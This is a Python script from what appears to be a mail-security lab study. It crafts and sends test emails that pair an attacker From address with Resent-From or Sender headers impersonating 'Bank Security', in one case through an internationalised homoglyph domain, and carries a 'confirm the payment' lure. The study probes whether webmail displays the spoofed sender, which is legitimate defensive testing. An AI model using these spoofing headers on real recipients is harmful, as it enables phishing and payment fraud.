"""Resent/Sender display-binding probes (candidate #2).

Chen A8 tested alternative-header display only when From is ABSENT. Here
From is PRESENT and attacker-controlled; Resent-From/Sender carry the victim
brand. If a webmail binds the display to Resent-From/Sender despite a present
From, that is a display-side substitution primitive.
"""
from __future__ import annotations

import json
import subprocess
import sys
import time
from pathlib import Path

RUN = Path("/mnt/e/MailSecLab/received-lab/results/research/w2-20261002a")
STAGE = RUN / "resent"
EVIDENCE = "/evidence/w2-20261002a/resent"

CASES = [
    {"name": "rsc1-resent-victim", "extra": b"Resent-From: Bank Security <security@xn--mnchen-3ya.lab.test>\r\n", "from": b"From: Attacker <attacker@evil.test>"},
    {"name": "rsc2-resent-obs-victim", "extra": b"Resent-From : Bank Security <security@xn--mnchen-3ya.lab.test>\r\n", "from": b"From: Attacker <attacker@evil.test>"},
    {"name": "rsc3-sender-victim", "extra": b"Sender: Bank Security <security@xn--mnchen-3ya.lab.test>\r\n", "from": b"From: Attacker <attacker@evil.test>"},
    {"name": "rsc4-resent-ulabel", "extra": "Resent-From: Bank Security <security@m\u00fcnchen.lab.test>\r\n".encode("utf-8"), "from": b"From: Attacker <attacker@evil.test>"},
    {"name": "rsc5-control-plain", "extra": b"", "from": b"From: Attacker <attacker@evil.test>"},
]


def sh(args, timeout=90):
    proc = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout, check=False)
    return proc.returncode, proc.stdout.decode("utf-8", "replace"), proc.stderr.decode("utf-8", "replace")


def main() -> None:
    STAGE.mkdir(parents=True, exist_ok=True)
    for case in CASES:
        case_id = "rs2-" + case["name"]
        raw = (case["extra"] + case["from"] + b"\r\n" +
               b"To: bob@lab.test\r\n"
               b"Date: Sat, 3 Oct 2026 12:00:00 +0000\r\n"
               + ("Subject: [%s] resent binding probe\r\n" % case_id).encode()
               + ("Message-ID: <%s@lab.test>\r\n" % case_id).encode()
               + ("X-Case-ID: %s\r\n" % case_id).encode()
               + b"\r\nPlease confirm the payment.\r\n")
        (STAGE / f"{case['name']}.eml").write_bytes(raw)
        code, out, err = sh([
            "docker", "exec", "msl-client", "python3", "/opt/research/lib/smtp_send.py",
            "--server", "msl-auth-postfix", "--port", "25",
            "--mail-from", "alice@lab.test", "--rcpt-to", "bob@lab.test",
            "--input", f"{EVIDENCE}/{case['name']}.eml",
            "--transcript", f"{EVIDENCE}/{case['name']}.smtp.txt",
        ], timeout=60)
        try:
            sent = json.loads(out)
        except json.JSONDecodeError:
            sent = {"accepted": False}
        print(case["name"], "->", (sent.get("reply") or "")[:40], flush=True)
        time.sleep(1.5)


if __name__ == "__main__":
    main()
